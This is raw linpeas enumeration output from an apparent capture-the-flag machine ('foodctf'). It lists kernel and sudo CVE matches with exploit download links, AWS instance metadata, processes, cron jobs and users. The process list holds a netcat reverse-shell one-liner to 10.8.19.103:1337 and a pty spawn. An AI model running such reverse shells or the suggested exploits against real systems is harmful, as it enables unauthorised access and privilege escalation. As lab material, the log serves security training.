  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 4.15.0-91-generic (buildd@lgw01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020
User & Groups: uid=1004(bread) gid=1004(bread) groups=1004(bread)
Hostname: foodctf
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)



Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
DONE

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.15.0-91-generic (buildd@lgw01-amd64-013) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #92-Ubuntu SMP Fri Feb 28 11:09:48 UTC 2020
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.4 LTS
Release:	18.04
Codename:	bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.21p2

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Potentially Vulnerable to CVE-2022-2588



╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Sat Feb 18 16:35:39 UTC 2023
 16:35:39 up 28 min,  0 users,  load average: 0.08, 0.02, 0.01

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices
UUID=fd0bfeb3-175d-45d7-8f5d-b188ff4a4184	/	ext4	defaults	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
USER=bread
SHLVL=2
HOME=/home/bread
OLDPWD=/home/bread
LOGNAME=bread
JOURNAL_STREAM=9:18775
_=./linpeas.sh
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=bee0b48386264fee881c324e4f649fc1
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/tmp
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Exposure: less probable
   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Seccomp enabled? ............... disabled
═╣ AppArmor profile? .............. unconfined
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/lxc
╔══════════╣ Am I Containered?
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                     ╚═══════╝
═╣ Google Cloud Platform? ............... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS Lambda? .......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-06a561cd68b41690a
instance-action: none
instance-id: i-0bbc802c5464173ec
instance-life-cycle: on-demand
instance-type: t2.micro
region: eu-west-1

══╣ Account Info
{
  "Code" : "Success",
  "LastUpdated" : "2023-02-18T16:06:43Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:90:b6:78:1e:8d/
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role


══╣ User Data


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.2  0.8 159632  8944 ?        Ss   16:07   0:03 /sbin/init maybe-ubiquity
root       391  0.0  1.6 127648 17068 ?        S<s  16:07   0:00 /lib/systemd/systemd-journald
root       415  0.0  0.1  97708  1892 ?        Ss   16:07   0:00 /sbin/lvmetad -f
root       420  0.0  0.4  45428  4380 ?        Ss   16:07   0:01 /lib/systemd/systemd-udevd
systemd+   506  0.0  0.3 141936  3344 ?        Ssl  16:07   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   627  0.0  0.5  80056  5344 ?        Ss   16:07   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   630  0.0  0.5  70640  5532 ?        Ss   16:07   0:00 /lib/systemd/systemd-resolved
root       723  0.0  1.6 169096 17040 ?        Ssl  16:07   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
bread      725  0.0  1.0 108640 10124 ?        Ssl  16:07   0:00 /home/bread/main
bread     1267  0.0  0.3  11592  3192 ?        S    16:26   0:00  _ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.19.103 1337 >/tmp/f
bread     1270  0.0  0.0   6316   764 ?        S    16:26   0:00      _ cat /tmp/f
bread     1271  0.0  0.0   4628   852 ?        S    16:26   0:00      _ sh -i
bread     1273  0.0  0.9  39084  9800 ?        S    16:27   0:00      |   _ python3 -c import pty;pty.spawn("/bin/bash")
bread     1274  0.0  0.4  21224  4820 pts/0    Ss   16:27   0:00      |       _ /bin/bash
bread     1328  0.1  0.2   5512  2564 pts/0    S+   16:35   0:00      |           _ /bin/sh ./linpeas.sh
bread     4724  0.0  0.0   5512   976 pts/0    S+   16:35   0:00      |               _ /bin/sh ./linpeas.sh
bread     4728  0.0  0.3  38524  3564 pts/0    R+   16:35   0:00      |               |   _ ps fauxwww
bread     4727  0.0  0.0   5512   976 pts/0    S+   16:35   0:00      |               _ /bin/sh ./linpeas.sh
bread     1272  0.0  0.2  15716  2136 ?        S    16:26   0:00      _ nc 10.8.19.103 1337
daemon[0m     726  0.0  0.2  28332  2404 ?        Ss   16:07   0:00 /usr/sbin/atd -f
message+   728  0.0  0.4  50100  4508 ?        Ss   16:07   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
syslog     748  0.0  0.4 263036  4376 ?        Ssl  16:07   0:00 /usr/sbin/rsyslogd -n
root       757  0.0  0.3 106640  3656 ?        Ssl  16:07   0:00 /root/koth
root       758  0.0  0.3  30028  3300 ?        Ss   16:07   0:00 /usr/sbin/cron -f
tryhack+   763  0.0  0.5 106640  5532 ?        Ssl  16:07   0:00 /home/tryhackme/img
root       766  0.0  0.6 286340  6976 ?        Ssl  16:07   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       767  0.0  0.1 621536  1700 ?        Ssl  16:07   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       768  0.0  0.5  62124  5688 ?        Ss   16:07   0:00 /lib/systemd/systemd-logind
root       771  0.3  2.4 557680 25032 ?        Ssl  16:07   0:05 /usr/lib/snapd/snapd
root       772  0.0  0.3  33996  3180 ?        Ss   16:07   0:00 /usr/sbin/inetd
root       783  0.0  0.2  14664  2392 ttyS0    Ss+  16:07   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       793  0.0  0.1  14888  1976 tty1     Ss+  16:07   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root       806  0.0  0.7 291460  7284 ?        Ssl  16:07   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.6  72300  6400 ?        Ss   16:07   0:00 /usr/sbin/sshd -D
root       820  0.0  1.9 185948 20124 ?        Ssl  16:07   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
mysql      835  0.1 17.6 1166760 177312 ?      Sl   16:07   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
-rwxr-xr-x 1 root      root       1113504 Jun  6  2019 /bin/bash
lrwxrwxrwx 1 root      root             4 Aug  5  2019 /bin/sh -> dash
-rwxrwxr-x 1 tryhackme tryhackme  7390798 Mar 20  2020 /home/tryhackme/img
-rwxr-xr-x 1 root      root        129096 Feb  6  2020 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root      root        219272 Feb  6  2020 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root      root       1633360 Feb  6  2020 /lib/systemd/systemd-networkd
-rwxr-xr-x 1 root      root        378944 Feb  6  2020 /lib/systemd/systemd-resolved
-rwxr-xr-x 1 root      root         38976 Feb  6  2020 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root      root        584136 Feb  6  2020 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root      root         56552 Jan  8  2020 /sbin/agetty
lrwxrwxrwx 1 root      root            20 Feb  6  2020 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root      root         84104 Dec  5  2019 /sbin/lvmetad
-rwxr-xr-x 1 root      root        236584 Jun 10  2019 /usr/bin/dbus-daemon[0m
-rwxr-xr-x 1 root      root         18504 Nov 23  2018 /usr/bin/lxcfs
lrwxrwxrwx 1 root      root             9 Oct 25  2018 /usr/bin/python3 -> python3.6
-rwxr-xr-x 1 root      root        182552 Dec 18  2017 /usr/lib/accountsservice/accounts-daemon[0m
-rwxr-xr-x 1 root      root         14552 Mar 27  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root      root      18927720 Oct 30  2019 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root      root         26632 Feb 20  2018 /usr/sbin/atd
-rwxr-xr-x 1 root      root         47416 Nov 16  2017 /usr/sbin/cron
-rwxr-xr-x 1 root      root         39296 Nov  1  2017 /usr/sbin/inetd
-rwxr-xr-x 1 root      root      24613992 Jan 21  2020 /usr/sbin/mysqld
-rwxr-xr-x 1 root      root        680488 Apr 24  2018 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root      root        786856 Mar  4  2019 /usr/sbin/sshd

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information
COMMAND    PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Mar 20  2020 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rw-r--r--  1 root root  589 Jan 30  2019 mdadm
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Aug  5  2019 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x  2 root root 4096 Mar 20  2020 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 30  2019 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 93 root root 4096 Mar 31  2020 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Sun 2023-02-19 00:33:35 UTC  7h left       Sat 2023-02-18 16:07:39 UTC  28min ago apt-daily.timer              apt-daily.service
Sun 2023-02-19 06:44:21 UTC  14h left      Sat 2023-02-18 16:07:39 UTC  28min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Sun 2023-02-19 08:37:40 UTC  16h left      Sat 2023-02-18 16:07:39 UTC  28min ago motd-news.timer              motd-news.service
Sun 2023-02-19 16:22:30 UTC  23h left      Sat 2023-02-18 16:22:30 UTC  13min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2023-02-20 00:00:00 UTC  1 day 7h left Sat 2023-02-18 16:07:39 UTC  28min ago fstrim.timer                 fstrim.service
n/a                          n/a           n/a                          n/a       snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core/7270/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/7270/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/7270/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/7270/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/7270/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/7270/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core/7270/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/7270/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/7270/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/7270/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/8689/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/8689/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/run/acpid.socket
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 630 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -                  
:1.1                                 627 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -                  
:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
:1.22                               7531 busctl          bread            :1.22         pings.service             -          -                  
:1.3                                 766 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
:1.5                                 806 polkitd         root             :1.5          polkit.service            -          -                  
:1.6                                 768 systemd-logind  root             :1.6          systemd-logind.service    -          -                  
:1.8                                 723 networkd-dispat root             :1.8          networkd-dispatcher.se…ce -          -                  
:1.9                                 820 unattended-upgr root             :1.9          unattended-upgrades.se…ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             766 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           806 polkitd         root             :1.5          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               768 systemd-logind  root             :1.6          systemd-logind.service    -          -                  
org.freedesktop.network1             627 systemd-network systemd-network  :1.1          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             630 systemd-resolve systemd-resolve  :1.0          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
foodctf
127.0.0.1 localhost
127.0.1.1 foodctf

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.241.181  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::90:b6ff:fe78:1e8d  prefixlen 64  scopeid 0x20<link>
        ether 02:90:b6:78:1e:8d  txqueuelen 1000  (Ethernet)
        RX packets 121256  bytes 8372572 (8.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 120827  bytes 7358771 (7.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 180  bytes 16060 (16.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 180  bytes 16060 (16.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:46969           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::16109                :::*                    LISTEN      -                   
tcp6       0      0 :::9999                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::15065                :::*                    LISTEN      725/main            

╔══════════╣ Can I sniff with tcpdump?
No



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1004(bread) gid=1004(bread) groups=1004(bread)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
bread:x:1004:1004:,,,:/home/bread:/bin/bash
food:x:1001:1001:,,,:/home/food:/bin/bash
pasta:x:1002:1002:,,,:/home/pasta:/bin/bash
ramen:x:1003:1003:,,,:/home/ramen:/bin/bash
root:x:0:0:root:/root:/bin/bash
tryhackme:x:1000:1000:thm:/home/tryhackme:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
